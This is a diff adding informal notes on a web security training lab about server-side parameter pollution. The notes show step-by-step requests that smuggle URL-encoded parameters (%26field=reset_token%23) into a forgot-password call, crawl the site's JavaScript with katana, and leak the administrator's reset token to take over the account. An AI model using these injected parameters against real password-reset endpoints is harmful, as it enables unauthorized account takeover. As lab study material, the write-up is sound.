@@ -1,0 +1,26 @@
+LAB INFO: Exploiting server-side parameter pollution in a query string
+
+MORE INFO: We need to login as the administrator and delete the user carlos
+
+
+ANALYSIS:
+1. Go to the login page.
+2. Hit the random username let's say we hit: administraor and do the forgot password
+3. And then it will give a field to give the username: give username as: administrator
+4. And then go to the burp and do: It will show POST /forgot-password endpoint with json result as:
+    4.1 {"type":"email","result":"*****@normal-user.net"}  
+5. Now try to add the, more parameter in the request field like:
+   5.1 csrf=jTtPTDzVFsp0oRaE3RHT3dmR7ihaJz6X&username=administrator%26x=y   --> shows as paramter is not supported
+   5.2 csrf=jTtPTDzVFsp0oRaE3RHT3dmR7ihaJz6X&username=administrator%23x=y   --> shows error as Field not specified 
+    from here we know that there is a parameter name called field
+    5.3 csrf=jTtPTDzVFsp0oRaE3RHT3dmR7ihaJz6X&username=administrator%26field=x  --> this shows an client error Invalid error
+    5.4 csrf=jTtPTDzVFsp0oRaE3RHT3dmR7ihaJz6X&username=administrator%23field=x   --> this shows an field not specified {this is not what we want}
+    5.5 {5.3} point is what we want I guess
+6. csrf=jTtPTDzVFsp0oRaE3RHT3dmR7ihaJz6X&username=administrator%26field=x%23 --> now we need to find a valid name for the variable x
+7. Let's view if there is some endpoint in the js
+8.Using katana to find th js: 
+   8.1 katana -u https://0a11002e0472caf780a01732000000cb.web-security-academy.net -jc | grep ".js" 
+   8.2 And then we find the forgot password.js i.e {https://0a11002e0472caf780a01732000000cb.web-security-academy.net/static/js/forgotPassword.js}
+9. when viewing that js we got a reset password link as: csrf=jTtPTDzVFsp0oRaE3RHT3dmR7ihaJz6X&username=administrator%26field=reset_token%23
+  9.1 we got here: {"type":"reset_token","result":"25s6a0ndos6ejjtvdnqqnfi8k6eee03k"}
+10 . now resetting the admin password and deleting carlos user would solved the lab.
